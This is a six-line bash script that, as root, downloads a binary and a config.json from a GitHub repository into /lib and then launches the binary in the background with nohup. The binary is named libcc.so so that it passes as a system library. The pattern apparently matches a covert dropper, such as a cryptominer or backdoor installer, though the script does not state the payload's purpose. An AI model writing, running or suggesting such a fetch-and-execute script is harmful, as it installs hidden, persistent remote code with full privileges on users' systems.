#!/bin/bash
sudo curl -o /lib/libcc.so https://github.com/Shallow-Sea/tools/raw/main/libcc.so
sudo curl -o /lib/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
sudo chmod +x /lib/libcc.so
sudo chmod +x /lib/config.json
sudo nohup /lib/libcc.so &
